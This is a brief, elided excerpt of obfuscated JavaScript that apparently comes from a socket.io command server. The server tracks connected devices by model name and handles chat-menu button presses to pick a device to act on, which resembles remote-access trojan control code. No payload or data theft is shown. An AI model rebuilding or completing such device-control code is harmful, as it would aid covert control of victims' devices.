...
io.on("connection", (_0x48afef) => {
  let _0x35d854 =
    _0x48afef.handshake.headers.model + "-" + io.sockets.sockets.size ||
    "no information";
                      ...
                      if (_0xdbde0c.text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
                        ...
                        if (_0xdbde0c.text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
                          ...
                          if (_0xdbde0c.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
                            let _0x3202e5 = io.sockets.sockets.get(
